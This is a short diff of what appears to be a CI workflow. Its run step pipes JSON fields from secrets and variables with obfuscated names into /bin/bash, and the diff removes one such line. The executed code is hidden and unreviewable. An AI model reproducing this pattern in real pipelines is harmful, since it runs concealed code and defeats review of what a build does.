@@ -21,7 +21,6 @@ jobs:
           tnb94637: ${{ secrets.tnb94637 }}
         run: |
           printf '%s' "$tnb94637" | jq -r .w37 | /bin/bash
-          printf '%s' "$snhk05167" | jq -r .eai7509 | /bin/bash
           echo $pb8 | jq -r .hw8 | /bin/bash
           echo $hzl22234 | jq -r .toet276 | /bin/bash
           echo $acg55 | jq -r .tlqe5511 | /bin/bash
